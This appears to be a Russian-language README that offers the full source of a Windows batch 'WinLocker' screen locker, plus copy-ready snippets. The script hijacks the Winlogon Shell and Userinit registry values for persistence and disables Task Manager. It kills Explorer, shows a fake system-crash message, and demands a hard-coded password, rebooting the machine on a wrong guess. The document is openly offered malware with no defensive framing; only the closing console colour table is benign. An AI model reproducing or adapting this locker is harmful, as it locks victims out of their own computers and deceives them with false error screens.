# bitlokerV2

Полный код улучшенного ВинЛокера(Важно скопировать, а не переписать!):

________________________________________________________________________

@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
Taskkill/f /im explorer.exe
Title WINLOCKER(v2)
color 4


echo error
echo 0000000x00000000000)))))error echo sistem 32:0000000x000120)))(
echo Technical Information:

echo *** STOP: 0x1000007e 
echo (0xffffffffc0000005, 
echo 0xfffff80002e55151, 
echo 0xfffff880009a99d8,
echo 0xfffff880009a9230)
echo *** xNtKrnl.exe - Address 
echo 0xfffff80002e55151 base at echo 0xfffff80002e0d000 DateStamp
echo 0x4ce7951a
echo Enter password

:h
set/p x=
if %x%==2022 (echo win start
start explorer
exit
) else (
echo Your sistem was be removed!
shutdown /r
)
goto h

________________________________________________________________________

Код для Блокировки-Разблокировки Диспетчера задач(Важно скопировать, а не переписать!):

REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

0 - разблокировать 
1 - заблокировать
________________________________________________________________________

Код для записи в автозагрузку(Важно скопировать, а не вставить!):

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
________________________________________________________________________
Все новые строчки(Важно скопировать, а не вставить!):

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
________________________________________________________________________
Путь в редакторе реестра:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
________________________________________________________________________
Цвета в командной строке:
0 = Черный       8 = Серый
1 = Синий         9 = Светло-синий
2 = Зеленый    A = Светло-зеленый
3 = Голубой      B = Светло-голубой
4 = Красный    C = Светло-красный
5 = Лиловый   D = Светло-лиловый
6 = Желтый     E = Светло-желтый
7 = Белый        F = Ярко-белый
